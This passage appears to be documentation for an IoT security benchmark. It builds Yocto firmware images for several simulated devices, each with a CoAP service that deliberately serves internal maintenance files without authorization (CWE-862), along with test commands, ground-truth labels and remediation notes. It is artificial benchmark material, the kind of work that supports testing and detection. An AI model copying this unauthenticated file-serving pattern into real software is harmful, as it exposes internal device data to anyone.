`Group=coapfixture` and `After=network.target`. It retains strict filesystem
protection, no new privileges, an empty capability set, private temporary/device
namespaces and restricted socket families. The daemon prints the exact warning
when starting. UDP port 5683 needs no privileged capability; no sudo rule or
OS login credential is introduced.

### Read-only scope and distinctions

The daemon rejects query strings and request bodies with `4.00 Bad Request`.
Unknown resource URIs return `4.04 Not Found`; unregistered write methods such
as POST, PUT and DELETE return `4.05 Method Not Allowed`. Request URIs, query
strings and payloads never become filenames or path fragments. The two fixed
files are opened with `O_NOFOLLOW` and `O_NONBLOCK`, checked as regular files,
and read with a maximum of 512 bytes. Missing files, symlinks, empty files and
oversized/non-regular files fail with `5.00 Internal Server Error`.
There is no application access to other files or any write operation. Libcoap's
standard resource discovery may list the registered URIs; it does not expose
additional internal files.

This fixture differs from generic vulnerable Java/JAR applications: none is
installed. It differs from a generic vulnerable C binary unrelated to firmware:
this executable is a real systemd-started CoAP service linked to actual
image-installed files. It differs from ordinary CoAP serving intentionally
public information: these files are explicitly internal-maintenance-only.
It differs from a generic network service because the request/resource/response
is CoAP, backed by libcoap rather than a custom line protocol.

It differs from Path Traversal and arbitrary file-read examples: clients select
only registered resources, never filesystem paths, and cannot escape the
predefined mapping. It differs from command-execution vulnerabilities because
the handler performs only bounded reads and response construction. It differs
from hardcoded-credential fixtures because this service contains no login
password or shared authorization secret. It also differs from ordinary internal
files never reachable through a protocol handler: here a CoAP GET actually
returns those file bytes.

**A CoAP server merely existing is not sufficient. An internal file merely
existing is not sufficient.** The finding requires a demonstrable relationship:
**a CoAP-accessible resource exposes information originating from a predefined
internal firmware file without appropriate access restrictions**. A resource
name, marker string or metadata label alone does not establish the vulnerability.

### Local build and manual testing

Run host commands from the repository root. Validate the layer and one graph:

~~~bash
docker compose run --rm yocto bash -lc \
  'source /opt/yocto/yocto-env.sh && bitbake -p && bitbake -n iotbench-router-cwe862-coap-internal-files'
~~~

Build all eleven using the normal exporter:

~~~bash
for recipe in meta-iotbench/recipes-images/iotbench-*-cwe862-coap-internal-files.bb; do
    firmware=$(basename "$recipe" .bb)
    FIRMWARE="${firmware#iotbench-}" docker compose run --rm yocto || exit 1
done
~~~

The default is `qemuarm64`. The existing `YOCTO_MACHINE` selector also supports
`qemuarm`, `qemux86-64`, `qemux86` and `qemumips`; use the same selector for
build and boot. `scripts/build-all.sh` discovers all these recipes automatically.
Outputs go to `deploy-images/<device>-cwe862-coap-internal-files/<machine>/`.

Boot a selected image with its per-device command below. On Apple Silicon add
`QEMU_ACCEL=hvf QEMU_CPU=host`. The host forwards
`127.0.0.1:5683/udp` to guest `5683/udp`; `QEMU_COAP_PORT` changes only the
host UDP port. Existing HTTP/MQTT/Modbus profile forwarding is retained.
For a complete manual router example on Apple Silicon, run this on the host
from the repository root (skip rebuilding if the image is already exported):

~~~bash
FIRMWARE=router-cwe862-coap-internal-files docker compose run --rm yocto
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 QEMU_COAP_PORT=5683 \
  FIRMWARE=router-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Wait until the QEMU console shows `login:`. The startup output must include
`CoAP: coap://127.0.0.1:5683`. No guest login is needed for a CoAP request.
Use a second host terminal for these manual reads:

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` followed by the exact internal file content and the
corresponding `COAP_INTERNAL_CONFIG_EXPOSED` or
`COAP_INTERNAL_MAINTENANCE_EXPOSED` line. No credentials or role are supplied.
These are CoAP/UDP endpoints; an HTTP browser or ordinary HTTP curl request does
not exercise them. If using host UDP port 15683, add `--port 15683` to every
client command. The standard-library client only contacts host loopback and
does not discover or scan other machines.

From the guest's root serial console (existing `root` / `routeradmin`
development login), inspect the source of those same bytes and service:

~~~bash
systemctl status iotbench-coap-internal-files.service --no-pager
cat /usr/share/iotbench/coap-internal-files/internal/device.conf
cat /usr/share/iotbench/coap-internal-files/internal/maintenance.dat
~~~

Compare the file contents with the CoAP response. This inspection is evidence
of file origin; root login is not required by the CoAP request.

#### Manual file-origin check in a disposable snapshot

After logging into the guest serial console, append one synthetic line
**inside the guest**:

~~~bash
printf '%s\n' 'fixture_probe=manual-test' >> /usr/share/iotbench/coap-internal-files/internal/device.conf
~~~

Then repeat the request **from the host terminal**:

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
~~~

The `2.05 Content` response must now include `fixture_probe=manual-test`.
This proves that the response originates from the current internal file rather
than an unused string or fixed response literal. Quit QEMU with **Ctrl-A**, then
**X**; the normal disposable snapshot discards this test edit.

#### Connection refused: match the forwarded UDP port

`ConnectionRefusedError: [Errno 61] Connection refused` can occur when the
client uses a host UDP port that QEMU is not forwarding. Check the
`CoAP: coap://127.0.0.1:<port>` line printed when QEMU starts.

For example, if QEMU was started without `QEMU_COAP_PORT`, its default host
port is **5683**, so the working commands are:

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Using `--port 15683` against that instance will not reach the server. To use
15683, first quit QEMU and restart it with `QEMU_COAP_PORT=15683`, then use
`--port 15683` in every host client command. Changing a shell variable after
QEMU has started does not change the existing forwarding.

If the port matches but the server still does not respond, inspect
`systemctl status iotbench-coap-internal-files.service --no-pager` inside the
guest and confirm that the selected firmware is `router-cwe862-coap-internal-files`
(or another device's matching CoAP fixture).

### Automated local verification and remediation

Against an already running fixture, use the per-device `--device` command.
Expected: two `PASS` lines. It checks exact unauthenticated file exposure with
CON and NON messages, repeated GETs, correct tokens/message IDs/Content-Format,
and rejection of unknown/path-shaped URIs, queries, request bodies and write
methods without changing either file.

Use `--boot <device>` or `--all` separately from manual QEMU to let the runner
boot/test/close disposable snapshots. Expected: three `PASS` lines per image.
It also checks the enabled service, identity, warning and file metadata, then
temporarily changes only the synthetic internal configuration file inside the
disposable guest. The changed content must appear over CoAP, proving the actual
file-read-to-response relationship. Missing, symlink and oversized internal
files must fail closed; the original bytes are restored. No host file is
modified or exposed.

~~~bash
QEMU_ACCEL=hvf QEMU_CPU=host QEMU_HTTP_PORT=18080 \
  QEMU_MQTT_PORT=21883 QEMU_MODBUS_PORT=11502 QEMU_COAP_PORT=15683 \
  python3 scripts/test-coap-internal-files.py --all
~~~

Offline `--image` verification reads ext4 or ext4.zst via `debugfs` without
mounting or executing it. It checks the two synthetic files, actual ELF URI/file
mappings, installed handler source, locked unprivileged account, service/enable
link, permissions, ground truth and warning. Use the builder commands below, or
host Python 3 with `zstd` and `debugfs`. Expected: two `PASS` lines.
Console evidence is saved alongside each exported image as `validation-console.log`.

Safe remediation is to remove internal-file resources from the externally
reachable CoAP interface, or establish client identity and explicitly authorize
the maintenance role before opening the files. A secure transport such as DTLS
can support client authentication, but transport encryption alone does not decide
who is authorized to read each resource. Keep the constant mapping, unprivileged
identity, bounded reads and normal filesystem permissions. A corrected variant
should reject anonymous GETs, permit only an authorized maintenance client and
continue rejecting unknown resources and writes. The known-positive exposure
test must then fail its unrestricted-content assertion. Apply source changes
and rebuild for a lasting fix; normal QEMU snapshots discard test edits.


### Completed validation

On 2026-10-07, all eleven `qemuarm64` fixtures built and exported successfully
after BitBake parsing and a router dependency dry run. Offline `debugfs`
inspection of every compressed ext4 export confirmed the two exact synthetic
files and device class, fixed URI/file mappings in the ELF, matching installed
handler source, locked UID/GID 992 daemon account, enabled systemd unit,
`0640` internal files in a `0750` directory, ground truth and required warning.
The daemon ELF and maintenance file were identical across all device images.
Each package manifest contained exactly one vulnerability package,
`cwe862-coap-internal-files`.

All eleven images booted in disposable QEMU snapshots using HVF and the host
CPU. Every image passed unauthenticated CON/NON GET checks with exact file
bytes, repeated requests and the normal rejection controls. A temporary change
to the actual internal synthetic configuration appeared in the CoAP response,
demonstrating file origin. Missing, symlink and oversized files were rejected;
the original content was restored. All CoAP requests targeted host loopback
UDP 15683, forwarded to guest UDP 5683.

The [local validation report](../deploy-images/coap-internal-files-qemuarm64-validation.txt)
records results, source/file-origin evidence and rootfs/kernel/daemon/file
SHA-256 checksums. Every export includes `rootfs.manifest`,
`validation-console.log` and `validation-protocol.log`. Build logs are saved
as `deploy-images/coap-internal-files-qemuarm64-build.log` and
`deploy-images/coap-internal-files-qemuarm64-parse-and-initial-build.log`.
Other supported architectures were not built or boot-tested in this run.
No external firmware-analysis engine was run; static findings remain expected
ground truth corroborated by real firmware files and protocol behavior.

### CoAP Internal Files — doorlock

Simulated device: **access-control door lock**, reusing
`meta-iotbench/recipes-devices/doorlock/`. Firmware directory:
`deploy-images/doorlock-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-doorlock-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/doorlock-cwe862-coap-internal-files/qemuarm64/iotbench-doorlock-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=doorlock`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=doorlock-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=doorlock-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=doorlock` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device doorlock`.
Alternatively, use `--boot doorlock` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/doorlock-cwe862-coap-internal-files/qemuarm64/iotbench-doorlock-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — envsensor

Simulated device: **environmental sensor**, reusing
`meta-iotbench/recipes-devices/envsensor/`. Firmware directory:
`deploy-images/envsensor-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-envsensor-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/envsensor-cwe862-coap-internal-files/qemuarm64/iotbench-envsensor-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=envsensor`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=envsensor-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=envsensor-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=envsensor` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device envsensor`.
Alternatively, use `--boot envsensor` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/envsensor-cwe862-coap-internal-files/qemuarm64/iotbench-envsensor-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — healthmonitor

Simulated device: **health monitor**, reusing
`meta-iotbench/recipes-devices/healthmonitor/`. Firmware directory:
`deploy-images/healthmonitor-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-healthmonitor-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/healthmonitor-cwe862-coap-internal-files/qemuarm64/iotbench-healthmonitor-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=healthmonitor`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=healthmonitor-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=healthmonitor-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=healthmonitor` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device healthmonitor`.
Alternatively, use `--boot healthmonitor` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/healthmonitor-cwe862-coap-internal-files/qemuarm64/iotbench-healthmonitor-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — ipcamera

Simulated device: **surveillance IP camera**, reusing
`meta-iotbench/recipes-devices/ipcamera/`. Firmware directory:
`deploy-images/ipcamera-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-ipcamera-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/ipcamera-cwe862-coap-internal-files/qemuarm64/iotbench-ipcamera-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=ipcamera`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=ipcamera-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=ipcamera-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=ipcamera` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device ipcamera`.
Alternatively, use `--boot ipcamera` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/ipcamera-cwe862-coap-internal-files/qemuarm64/iotbench-ipcamera-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — plc

Simulated device: **industrial PLC gateway (OT)**, reusing
`meta-iotbench/recipes-devices/plc/`. Firmware directory:
`deploy-images/plc-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-plc-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/plc-cwe862-coap-internal-files/qemuarm64/iotbench-plc-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=plc`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=plc-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=plc-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=plc` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device plc`.
Alternatively, use `--boot plc` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/plc-cwe862-coap-internal-files/qemuarm64/iotbench-plc-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — router

Simulated device: **network gateway/router**, reusing
`meta-iotbench/recipes-devices/router/`. Firmware directory:
`deploy-images/router-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-router-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/router-cwe862-coap-internal-files/qemuarm64/iotbench-router-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=router`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=router-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=router-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=router` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device router`.
Alternatively, use `--boot router` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
  --image /export/router-cwe862-coap-internal-files/qemuarm64/iotbench-router-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst
~~~


### CoAP Internal Files — smartbulb

Simulated device: **lighting smart bulb**, reusing
`meta-iotbench/recipes-devices/smartbulb/`. Firmware directory:
`deploy-images/smartbulb-cwe862-coap-internal-files/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartbulb-cwe862-coap-internal-files.bb`.
Default rootfs:
`deploy-images/smartbulb-cwe862-coap-internal-files/qemuarm64/iotbench-smartbulb-cwe862-coap-internal-files-qemuarm64.rootfs.ext4.zst`;
kernel `Image` is exported in the same directory.

The CoAP implementation is `files/iotbench-coap-internal-files.c` under
`meta-iotbench/recipes-vulns/cwe862-coap-internal-files/`, installed as
`/usr/bin/iotbench-coap-internal-files`. Its systemd unit is
`/usr/lib/systemd/system/iotbench-coap-internal-files.service`, enabled at
`multi-user.target` and running as the locked `coapfixture` UID/GID 960.
It listens on guest UDP 5683. Relevant annotations are `handler.c`, `NOTICE`
and `ground-truth.json` under `/usr/share/iotbench/coap-internal-files/`;
device identity remains in `/etc/iotbench/device.conf`.

`GET /device/config` maps only to
`/usr/share/iotbench/coap-internal-files/internal/device.conf`, containing
synthetic `device_class=smartbulb`, asset reference, calibration profile and
diagnostic mode. `GET /maintenance/info` maps only to
`/usr/share/iotbench/coap-internal-files/internal/maintenance.dat`, containing
a fake maintenance reference, service window and self-test state. Both files
are marked internal-maintenance-only, root:coapfixture `0640` in a `0750`
directory. Those maintenance artifacts should require an authorized maintenance
client rather than be published as ordinary public telemetry.

The vulnerable flow is **CoAP GET → registered `get_internal_file` handler →
constant resource mapping → `openat`/`read` of that internal synthetic file →
`coap_add_data` → `2.05 Content` response**. The intentionally missing check is
authorization of the client before opening/returning the internal file.
There is no request-derived filename, file modification or command execution.

Expected static-analysis finding: correlate each reachable CoAP resource with
its fixed internal file and read-to-response flow without a maintenance-access
decision. Expected ground-truth label: **CoAP server communicating with
vulnerable internal files**, **CWE-862 — Missing Authorization**.
Safe remediation: remove these resources from the public interface, or
authenticate and authorize maintenance clients before reading the files,
while retaining the fixed mapping and read-only service.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartbulb-cwe862-coap-internal-files docker compose run --rm yocto
FIRMWARE=smartbulb-cwe862-coap-internal-files ./scripts/run-qemu.sh
~~~

Local manual test (second host terminal, no credential):

~~~bash
python3 scripts/test-coap-internal-files.py --port 5683 --get /device/config
python3 scripts/test-coap-internal-files.py --port 5683 --get /maintenance/info
~~~

Expected: `CoAP 2.05` with `device_class=smartbulb` and
`COAP_INTERNAL_CONFIG_EXPOSED` for configuration, and
`COAP_INTERNAL_MAINTENANCE_EXPOSED` for maintenance. Both payloads contain
the exact corresponding internal-file bytes. Test this running device with
`python3 scripts/test-coap-internal-files.py --device smartbulb`.
Alternatively, use `--boot smartbulb` separately from manual QEMU for the
automatic disposable-guest file-origin and rejection checks.

Offline verification without booting (host):

~~~bash
docker compose run --rm yocto python3 /scripts/test-coap-internal-files.py \
